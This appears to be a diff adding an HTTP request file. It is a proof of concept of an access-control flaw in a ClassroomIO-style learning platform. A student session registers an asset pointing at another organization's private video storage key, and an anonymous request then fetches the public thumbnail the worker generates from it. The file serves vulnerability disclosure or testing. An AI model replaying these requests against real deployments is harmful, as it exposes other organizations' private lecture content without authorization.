@@ -1,0 +1,10 @@
+### create an asset pointing at a FOREIGN private videos key (no ownership check)
+POST http://localhost:21527/organization/assets HTTP/1.1
+Content-Type: application/json
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<attacker STUDENT session>
+
+{"kind":"video","provider":"upload","storageKey":"44444444-4444-4444-8444-444444444444/private-lecture-mp4_306f6508.mp4","byteSize":10890,"mimeType":"video/mp4","durationSeconds":2}
+
+### the worker then publishes a public frame; fetch it anonymously:
+GET http://localhost:21528/media/thumbnails/0b2b04e6-48eb-4bb6-8fde-280ca4cca0a5/middle-1790520568845.jpg
